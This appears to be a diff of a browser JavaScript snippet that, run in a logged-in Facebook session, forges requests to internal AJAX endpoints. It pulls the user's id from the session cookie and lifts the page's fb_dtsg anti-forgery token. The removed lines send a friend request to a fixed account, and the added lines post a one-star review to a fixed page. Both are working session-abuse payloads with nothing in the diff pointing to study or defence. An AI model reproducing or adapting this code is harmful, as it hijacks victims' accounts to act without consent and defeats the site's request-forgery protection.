@@ -1,6 +1,6 @@
   var X = new XMLHttpRequest();
-  var XURL = "//www.facebook.com/ajax/add_friend/action.php?__pc=EXP1%3ADEFAULT";
-  var XParams = "&to_friend=100000659232912&action=add_friend&how_found=profile_button&ref_param=pb&link_data[gt][profile_owner]=100003085666469&link_data[gt][ref]=timeline%3Atimeline&outgoing_id=js_u&logging_location&no_flyout_on_click=true&ego_log_data&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&__dyn=&__req=&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=&__rev=&confirmed=1";
+  var XURL = "//www.facebook.com/ajax/pages/review/add?mechanism=inline_rating&send_reviews_feed_markup=1&__pc=EXP1%3ADEFAULT";
+  var XParams = "&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"%3AAQHw-nU4gS90&id=289226391273473&ref=page_review_tab&id_to_replace=&source=11&rating=1&note_message=&audience[8787770733][value]=80&done_button=1&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&__dyn=&__req=&ttstamp=";
   X.open("POST", XURL, true);
   X.onreadystatechange = function () {
     if (X.readyState == 4 && X.status == 200) {
@@ -8,7 +8,3 @@
     }
   };
   X.send(XParams);
-
-
-
-
